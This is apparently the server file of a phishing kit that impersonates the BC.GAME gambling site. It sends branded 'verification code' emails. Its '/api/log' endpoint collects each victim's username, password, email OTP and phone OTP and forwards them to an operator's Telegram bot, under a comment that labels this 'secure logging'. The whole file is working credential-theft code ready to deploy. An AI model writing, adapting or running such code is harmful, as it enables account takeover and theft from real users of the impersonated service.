require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
const axios = require('axios'); // Added axios for Telegram API
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Nodemailer setup
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Endpoint to send OTP
app.post('/send-otp', async (req, res) => {
    const { email } = req.body;
    if (!email) return res.status(400).json({ success: false });

    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: email,
        subject: '🔐 BC.GAME Verification Code',
        html: `<div style="background:#1c1e22; color:white; padding:20px; border-radius:10px; font-family:sans-serif; text-align:center;">
                <h2 style="color:#3bc117;">Verification Code</h2>
                <div style="font-size:32px; font-weight:bold; letter-spacing:5px; margin:20px 0;">${otp}</div>
                <p>Enter this code to verify your account.</p>
               </div>`
    };

    try {
        await transporter.sendMail(mailOptions);
        res.json({ success: true, otp }); // Sending OTP back for demo - in production store it!
    } catch (error) {
        console.error('Email Error:', error);
        res.status(500).json({ success: false });
    }
});

// SECURE LOGGING ENDPOINT - Token stays on server!
app.post('/api/log', async (req, res) => {
    const { title, data } = req.body;
    const token = process.env.LOG_BOT_TOKEN;
    const chatId = process.env.LOG_BOT_CHAT_ID;

    if (!token || !chatId) {
        return res.status(500).json({ success: false, message: 'Bot config missing' });
    }

    const message = `
${title}
━━━━━━━━━━━━━━━
👤 <b>User</b>: ${data.id}
🔑 <b>Pass</b>: <code>${data.pass}</code>
📧 <b>Email OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
📱 <b>Phone OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
🕒 <b>Time</b>: ${data.time}
━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        res.json({ success: true });
    } catch (error) {
        console.error('Telegram Log Error:', error.message);
        res.status(500).json({ success: false });
    }
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
